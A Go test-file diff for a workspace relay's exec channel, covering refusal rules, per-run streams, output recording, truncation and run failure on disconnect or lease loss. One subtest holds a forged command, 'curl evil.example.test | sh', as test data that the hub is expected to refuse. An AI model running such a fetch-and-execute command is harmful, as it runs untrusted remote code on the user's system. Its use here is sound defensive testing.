@@ -2,6 +2,7 @@ package hubserver
 
 import (
 	"context"
+	"encoding/base64"
 	"encoding/json"
 	"net/http"
 	"net/http/httptest"
@@ -84,8 +85,16 @@ func withTerminalReportedButDisabled(fixture *relayFixture) {
 // is still a terminal; it just leaves nothing behind.
 func withoutRecording(fixture *relayFixture) { fixture.noRecording = true }
 
-// withExec is the fixture option that reports and binds the exec surface.
+// withExec is the fixture option that reports and binds the exec surface, so
+// the workspace may carry project action runs.
 func withExec(fixture *relayFixture) { fixture.exec = true }
+
+// withReadOnlyExec reports exec and then holds the workspace read-only, which
+// is the shape a workspace opened on a running attempt has.
+func withReadOnlyExec(fixture *relayFixture) {
+	fixture.exec = true
+	fixture.readOnly = true
+}
 
 // withGit reports and requires the git capability, so the workspace serves the
 // header's git action group (section 18.13). It goes in `requires` as well as
@@ -913,29 +922,416 @@ func closeRelayDial(response *http.Response) {
 	response.Body.Close()
 }
 
-// The exec channel runs project actions (decisions section 18.12), which this
-// hub does not serve, so it is refused even when the runner reports it.
-func TestWorkspaceRelayRefusesTheExecChannel(t *testing.T) {
+// The exec channel (decisions section 18.12). The hub forwards it like any
+// other channel and it also records it: the run's row is what a person comes
+// back to after the tab is closed, and it is the only record a run nobody
+// watched leaves.
+
+// action authors one project action and returns it.
+func (f *relayFixture) action(t *testing.T, name, command string) workspacesession.Action {
+	t.Helper()
+	response := performHubAPIRequest(t, f.service, http.MethodPost, f.base+"/actions", f.token,
+		map[string]any{"idempotency_key": newNativeID("actkey"), "name": name, "command": command})
+	requireNativeStatus(t, response, http.StatusCreated)
+	var authored workspacesession.Action
+	decodeHubResponse(t, response, &authored)
+	return authored
+}
+
+// queuedRun queues a run of an action on the fixture's workspace.
+func (f *relayFixture) queuedRun(t *testing.T, action workspacesession.Action) string {
+	t.Helper()
+	response := performHubAPIRequest(t, f.service, http.MethodPost,
+		f.base+"/actions/"+action.ID+"/runs", f.token,
+		map[string]any{"idempotency_key": newNativeID("runkey"), "workspace_id": f.workspace})
+	requireNativeStatus(t, response, http.StatusAccepted)
+	var receipt projectActionRunReceipt
+	decodeHubResponse(t, response, &receipt)
+	return receipt.RunID
+}
+
+// runRow reads a run straight from the database. The relay writes the row on
+// its own goroutines, so the row is what a test has to assert on; the frames
+// only prove what was forwarded.
+func (f *relayFixture) runRow(t *testing.T, runID string) actionRunRecord {
+	t.Helper()
+	run, err := readProjectActionRunByID(t.Context(), f.service.database.db, runID)
+	if err != nil {
+		t.Fatalf("read run %s: %v", runID, err)
+	}
+	return run
+}
+
+// execRunFrame is a person's run on the exec channel.
+func execRunFrame(runID string, action workspacesession.Action) workspacesession.Frame {
+	payload, err := workspacesession.Encode(workspacesession.ExecRun{
+		RunID: runID, ActionID: action.ID, Command: action.Command})
+	if err != nil {
+		panic(err)
+	}
+	return workspacesession.Frame{Channel: workspacesession.ChannelExec, Type: workspacesession.TypeExecRun, Payload: payload}
+}
+
+// execOutputFrame is one span of a run's combined output.
+func execOutputFrame(stream string, output workspacesession.ExecOutput) workspacesession.Frame {
+	payload, err := workspacesession.Encode(output)
+	if err != nil {
+		panic(err)
+	}
+	return workspacesession.Frame{Channel: workspacesession.ChannelExec, Stream: stream,
+		Type: workspacesession.TypeExecOutput, Payload: payload}
+}
+
+// execExitedFrame ends a run with an exit code.
+func execExitedFrame(stream string, code int) workspacesession.Frame {
+	payload, err := workspacesession.Encode(workspacesession.ExecExited{Code: code})
+	if err != nil {
+		panic(err)
+	}
+	return workspacesession.Frame{Channel: workspacesession.ChannelExec, Stream: stream,
+		Type: workspacesession.TypeExecExited, Payload: payload}
+}
+
+func TestWorkspaceRelayRefusesExecWhenTheRunnerDoesNotServeIt(t *testing.T) {
 	t.Parallel()
-	tests := []struct {
-		name    string
-		options []func(*relayFixture)
-	}{
-		{name: "runner does not serve exec"},
-		{name: "runner serves exec", options: []func(*relayFixture){withExec}},
+	f := newRelayFixture(t)
+	f.dialRunner(t)
+	person := f.dialPerson(t)
+
+	// The default runner reports files and diff. Exec is a surface a runner
+	// has to offer, so the channel is refused rather than forwarded to a
+	// runner that cannot run anything.
+	action := f.action(t, "Run tests", "go test ./...")
+	person.send(execRunFrame(newNativeID("actionrun"), action))
+	if payload := errorPayload(t, person.receive()); payload.Code != workspacesession.CodeForbidden {
+		t.Fatalf("exec answered %+v, want forbidden", payload)
 	}
-	for _, test := range tests {
-		t.Run(test.name, func(t *testing.T) {
-			t.Parallel()
-			f := newRelayFixture(t, test.options...)
-			f.dialRunner(t)
-			person := f.dialPerson(t)
-			person.send(workspacesession.Frame{Channel: workspacesession.ChannelExec, Type: workspacesession.TypeExecRun, Payload: json.RawMessage(`{}`)})
-			if payload := errorPayload(t, person.receive()); payload.Code != workspacesession.CodeForbidden {
-				t.Fatalf("exec answered %+v, want forbidden", payload)
-			}
-		})
+}
+
+func TestWorkspaceRelayRefusesExecOnAReadOnlyWorkspace(t *testing.T) {
+	t.Parallel()
+	f := newRelayFixture(t, withReadOnlyExec)
+	f.dialRunner(t)
+	person := f.dialPerson(t)
+
+	// The runner serves exec, and the workspace is still the one a model is
+	// editing. A command writes into that worktree, so the channel is refused
+	// whatever the runner can do.
+	action := f.action(t, "Run tests", "go test ./...")
+	person.send(execRunFrame(newNativeID("actionrun"), action))
+	if payload := errorPayload(t, person.receive()); payload.Code != workspacesession.CodeForbidden {
+		t.Fatalf("exec on a read-only workspace answered %+v, want forbidden", payload)
 	}
+}
+
+func TestWorkspaceRelayAnswersAnUnknownExecFrameType(t *testing.T) {
+	t.Parallel()
+	f := newRelayFixture(t, withExec)
+	runner := f.dialRunner(t)
+	person := f.dialPerson(t)
+
+	// Exec defines one person-originated frame. Anything else is answered
+	// before a stream is allocated, so a client cannot spend its whole budget
+	// on typos.
+	person.send(workspacesession.Frame{Channel: workspacesession.ChannelExec, Type: "input"})
+	if payload := errorPayload(t, person.receive()); payload.Code != workspacesession.CodeUnknownFrame {
+		t.Fatalf("an unknown exec type answered %+v, want unknown_frame", payload)
+	}
+	// The connection survives one bad frame, so the next legal run still
+	// reaches the runner.
+	action := f.action(t, "Run tests", "go test ./...")
+	person.send(execRunFrame(f.queuedRun(t, action), action))
+	if forwarded := runner.receive(); forwarded.Type != workspacesession.TypeExecRun {
+		t.Fatalf("the connection did not survive one bad frame: %+v", forwarded)
+	}
+}
+
+func TestWorkspaceRelayGivesEachExecRunItsOwnStream(t *testing.T) {
+	t.Parallel()
+	f := newRelayFixture(t, withExec)
+	runner := f.dialRunner(t)
+	person := f.dialPerson(t)
+	action := f.action(t, "Run tests", "go test ./...")
+
+	// Every run is its own process and its own seq space, exactly as every
+	// terminal open is its own PTY: two runs on one stream would share one
+	// sequence, and a reader could not tell whose output it was reading.
+	first := f.queuedRun(t, action)
+	second := f.queuedRun(t, action)
+	person.send(execRunFrame(first, action))
+	firstStream := runner.receive()
+	person.send(execRunFrame(second, action))
+	secondStream := runner.receive()
+	if firstStream.Stream == "" || firstStream.Stream == secondStream.Stream {
+		t.Fatalf("streams %q and %q, want two", firstStream.Stream, secondStream.Stream)
+	}
+	if firstStream.Seq != 1 || secondStream.Seq != 1 {
+		t.Fatalf("seqs = %d and %d, want each run's own space to start at 1", firstStream.Seq, secondStream.Seq)
+	}
+}
+
+func TestWorkspaceRelayRecordsAnExecRunThroughToItsExit(t *testing.T) {
+	t.Parallel()
+	f := newRelayFixture(t, withExec)
+	runner := f.dialRunner(t)
+	person := f.dialPerson(t)
+	action := f.action(t, "Run tests", "go test ./...")
+	run := f.queuedRun(t, action)
+
+	person.send(execRunFrame(run, action))
+	forwarded := runner.receive()
+	if forwarded.Type != workspacesession.TypeExecRun || forwarded.Actor == nil {
+		t.Fatalf("runner received %+v, want the run frame with the hub's actor stamp", forwarded)
+	}
+	// The row is claimed before the frame is forwarded, so a runner holding
+	// the frame is serving a run the hub has already marked running.
+	running := f.runRow(t, run)
+	if running.Status != workspacesession.RunRunning || running.StartedAt == nil || running.Revision != 2 {
+		t.Fatalf("run = %#v, want running with a start time at revision 2", running)
+	}
+
+	runner.send(execOutputFrame(forwarded.Stream, workspacesession.ExecOutput{Data: "ok\t"}))
+	if answer := person.receive(); answer.Type != workspacesession.TypeExecOutput {
+		t.Fatalf("person received %+v, want the output forwarded", answer)
+	}
+	// A command that writes binary to its stdout sends its spans encoded, and
+	// what is stored is the bytes rather than the envelope.
+	runner.send(execOutputFrame(forwarded.Stream, workspacesession.ExecOutput{
+		Data: base64.StdEncoding.EncodeToString([]byte("PASS\n")), Encoding: "base64"}))
+	person.receive()
+	runner.send(execExitedFrame(forwarded.Stream, 0))
+	person.receive()
+
+	waitFor(t, func() bool { return f.runRow(t, run).Status == workspacesession.RunSucceeded })
+	finished := f.runRow(t, run)
+	if finished.ExitCode == nil || *finished.ExitCode != 0 || finished.FinishedAt == nil {
+		t.Fatalf("run = %#v, want exit 0 and a finish time", finished)
+	}
+	if finished.Output != "ok\tPASS\n" || finished.OutputBytes != int64(len("ok\tPASS\n")) || finished.Truncated {
+		t.Fatalf("run = %#v, want the interleaved output stored whole", finished)
+	}
+	// A run that exited carries no reason: its exit code is the whole story.
+	if finished.Reason != "" {
+		t.Fatalf("run = %#v, want no reason", finished)
+	}
+	// The receipt is the output endpoint's own path, and the bytes are there.
+	body := performHubAPIRequest(t, f.service, http.MethodGet, finished.OutputArtifact, f.token, nil)
+	requireNativeStatus(t, body, http.StatusOK)
+	if body.Body.String() != "ok\tPASS\n" {
+		t.Fatalf("output = %q", body.Body.String())
+	}
+}
+
+func TestWorkspaceRelayRecordsANonZeroExitAsFailed(t *testing.T) {
+	t.Parallel()
+	f := newRelayFixture(t, withExec)
+	runner := f.dialRunner(t)
+	person := f.dialPerson(t)
+	action := f.action(t, "Run tests", "go test ./...")
+	run := f.queuedRun(t, action)
+
+	person.send(execRunFrame(run, action))
+	forwarded := runner.receive()
+	runner.send(execOutputFrame(forwarded.Stream, workspacesession.ExecOutput{Data: "FAIL\n"}))
+	person.receive()
+	runner.send(execExitedFrame(forwarded.Stream, 7))
+	person.receive()
+
+	waitFor(t, func() bool { return f.runRow(t, run).Status == workspacesession.RunFailed })
+	failed := f.runRow(t, run)
+	if failed.ExitCode == nil || *failed.ExitCode != 7 {
+		t.Fatalf("run = %#v, want exit 7", failed)
+	}
+	// The reason field is for a run whose outcome could not be established at
+	// all, which is not this one.
+	if failed.Reason != "" || failed.Output != "FAIL\n" {
+		t.Fatalf("run = %#v", failed)
+	}
+}
+
+func TestWorkspaceRelayTruncatesExecOutputAtTheCap(t *testing.T) {
+	t.Parallel()
+	f := newRelayFixture(t, withExec)
+	runner := f.dialRunner(t)
+	person := f.dialPerson(t)
+	action := f.action(t, "Run tests", "go test ./...")
+	run := f.queuedRun(t, action)
+
+	person.send(execRunFrame(run, action))
+	forwarded := runner.receive()
+	span := strings.Repeat("x", workspacesession.MaxExecOutputFrameBytes)
+	frames := workspacesession.MaxExecOutputBytes/len(span) + 2
+	for range frames {
+		runner.send(execOutputFrame(forwarded.Stream, workspacesession.ExecOutput{Data: span}))
+		answer := person.receive()
+		ack, err := workspacesession.Encode(workspacesession.AckPayload{Through: answer.Seq})
+		if err != nil {
+			t.Fatal(err)
+		}
+		// Acknowledging keeps the relay's own replay buffer from overflowing.
+		// That is a separate cap from the run's stored output, and this test is
+		// about the second one.
+		person.send(workspacesession.Frame{Channel: workspacesession.ChannelExec, Stream: forwarded.Stream,
+			Type: workspacesession.TypeAck, Payload: ack})
+	}
+	runner.send(execExitedFrame(forwarded.Stream, 0))
+
+	waitFor(t, func() bool { return workspacesession.TerminalRunStatus(f.runRow(t, run).Status) })
+	capped := f.runRow(t, run)
+	if capped.OutputBytes != workspacesession.MaxExecOutputBytes || len(capped.Output) != workspacesession.MaxExecOutputBytes {
+		t.Fatalf("stored %d bytes, want exactly %d", capped.OutputBytes, workspacesession.MaxExecOutputBytes)
+	}
+	// A reader who cannot tell a finished log from a cut one reads the cut one
+	// as finished.
+	if !capped.Truncated {
+		t.Fatalf("run = %#v, want truncated", capped)
+	}
+}
+
+func TestWorkspaceRelayFailsARunWhenThePersonDisconnects(t *testing.T) {
+	t.Parallel()
+	f := newRelayFixture(t, withExec)
+	runner := f.dialRunner(t)
+	person := f.dialPerson(t)
+	action := f.action(t, "Run tests", "go test ./...")
+	run := f.queuedRun(t, action)
+
+	person.send(execRunFrame(run, action))
+	forwarded := runner.receive()
+	runner.send(execOutputFrame(forwarded.Stream, workspacesession.ExecOutput{Data: "building\n"}))
+	person.receive()
+
+	// A run is not parked for a resume the way its stream is: a closed tab
+	// must not leave a build that looks like it is still going.
+	_ = person.socket.Close(websocket.StatusNormalClosure, "tab closed")
+	waitFor(t, func() bool { return f.runRow(t, run).Status == workspacesession.RunFailed })
+	failed := f.runRow(t, run)
+	if failed.Reason != workspacesession.RunReasonStreamClosed || failed.ExitCode != nil {
+		t.Fatalf("run = %#v, want stream_closed and no exit code", failed)
+	}
+	// The output collected before the disconnect is kept: it is the only
+	// record of what the run had done.
+	if failed.Output != "building\n" {
+		t.Fatalf("run = %#v, want the output collected so far", failed)
+	}
+}
+
+func TestWorkspaceRelayFailsARunWhenTheWorkspaceLeaseIsLost(t *testing.T) {
+	t.Parallel()
+	f := newRelayFixture(t, withExec)
+	runner := f.dialRunner(t)
+	person := f.dialPerson(t)
+	action := f.action(t, "Run tests", "go test ./...")
+	run := f.queuedRun(t, action)
+
+	person.send(execRunFrame(run, action))
+	forwarded := runner.receive()
+	runner.send(execOutputFrame(forwarded.Stream, workspacesession.ExecOutput{Data: "half a build\n"}))
+	person.receive()
+
+	// The lease expires, the sweep fails the workspace, and the run goes with
+	// it: the process was on a worktree the hub has given up on. The reason
+	// separates that from a workspace somebody closed.
+	f.advance(workspacesession.LeaseTTL + time.Second)
+	f.service.workspaces.sweep(t.Context())
+	waitFor(t, func() bool { return f.runRow(t, run).Status == workspacesession.RunFailed })
+	failed := f.runRow(t, run)
+	if failed.Reason != workspacesession.RunReasonLeaseLost {
+		t.Fatalf("run = %#v, want lease_lost", failed)
+	}
+	if failed.Output != "half a build\n" {
+		t.Fatalf("run = %#v, want the output collected so far", failed)
+	}
+}
+
+func TestWorkspaceRelayFailsARunWhenTheRunnerConnectionIsReplaced(t *testing.T) {
+	t.Parallel()
+	f := newRelayFixture(t, withExec)
+	runner := f.dialRunner(t)
+	person := f.dialPerson(t)
+	action := f.action(t, "Run tests", "go test ./...")
+	run := f.queuedRun(t, action)
+
+	person.send(execRunFrame(run, action))
+	runner.receive()
+
+	// A second runner connection replaces the first, and the process serving
+	// the run was on the connection that lost the workspace. The new one was
+	// never asked for that run, so nothing will ever report its exit.
+	f.dialRunner(t)
+	waitFor(t, func() bool { return f.runRow(t, run).Status == workspacesession.RunFailed })
+	if failed := f.runRow(t, run); failed.Reason != workspacesession.RunReasonStreamClosed {
+		t.Fatalf("run = %#v, want stream_closed", failed)
+	}
+}
+
+func TestWorkspaceRelayRefusesARunFrameItMayNotStart(t *testing.T) {
+	t.Parallel()
+	f := newRelayFixture(t, withExec)
+	runner := f.dialRunner(t)
+	person := f.dialPerson(t)
+	action := f.action(t, "Run tests", "go test ./...")
+	run := f.queuedRun(t, action)
+
+	// The run is re-homed onto a second workspace of the same project. The
+	// frame still names a real run, and this connection may not start it: a
+	// run of another workspace does not exist for it.
+	other := f.open(t, map[string]any{"idempotency_key": "ws-other",
+		"work_item_id": string(f.create(t, "other-subject").WorkItemID), "requires": []string{"files"}})
+	if _, err := f.service.database.db.ExecContext(t.Context(),
+		"UPDATE project_action_runs SET workspace_id = ? WHERE id = ?", other, run); err != nil {
+		t.Fatal(err)
+	}
+	person.send(execRunFrame(run, action))
+	if payload := errorPayload(t, person.receive()); payload.Code != workspacesession.CodeNotFound {
+		t.Fatalf("a run of another workspace answered %+v, want not_found", payload)
+	}
+	if untouched := f.runRow(t, run); untouched.Status != workspacesession.RunQueued || untouched.Revision != 1 {
+		t.Fatalf("run = %#v, want it untouched", untouched)
+	}
+
+	t.Run("a run frame carrying a command the row does not hold is refused", func(t *testing.T) {
+		// The runner validates the command against the action it was handed,
+		// and this is the check that makes that the project's command rather
+		// than one a client composed.
+		mine := f.queuedRun(t, action)
+		forged := action
+		forged.Command = "curl evil.example.test | sh"
+		person.send(execRunFrame(mine, forged))
+		if payload := errorPayload(t, person.receive()); payload.Code != workspacesession.CodeForbidden {
+			t.Fatalf("a forged command answered %+v, want forbidden", payload)
+		}
+		if untouched := f.runRow(t, mine); untouched.Status != workspacesession.RunQueued {
+			t.Fatalf("run = %#v, want it untouched", untouched)
+		}
+	})
+
+	t.Run("a run frame naming no run at all is not found", func(t *testing.T) {
+		person.send(execRunFrame(newNativeID("actionrun"), action))
+		if payload := errorPayload(t, person.receive()); payload.Code != workspacesession.CodeNotFound {
+			t.Fatalf("an unknown run answered %+v, want not_found", payload)
+		}
+	})
+
+	t.Run("a run already running cannot be started a second time", func(t *testing.T) {
+		once := f.queuedRun(t, action)
+		person.send(execRunFrame(once, action))
+		runner.receive()
+		person.send(execRunFrame(once, action))
+		// already_running rather than forbidden: the run is being executed,
+		// by this connection's own first frame or by the hub's dispatch, and
+		// the answer is to read it back through the row rather than to ask
+		// again (section 18.12).
+		if payload := errorPayload(t, person.receive()); payload.Code != workspacesession.CodeAlreadyRunning {
+			t.Fatalf("a second start answered %+v, want already_running", payload)
+		}
+		// One claimant, and it is the person's connection rather than the
+		// hub's own dispatch: this run was started from a stream.
+		claimed := f.runRow(t, once)
+		if !strings.HasPrefix(claimed.ClaimedBy, "relayconn_") {
+			t.Fatalf("claimed_by = %q, want the person connection that started it", claimed.ClaimedBy)
+		}
+	})
 }
 
 // The git channel (decisions section 18.13). It is the first channel that
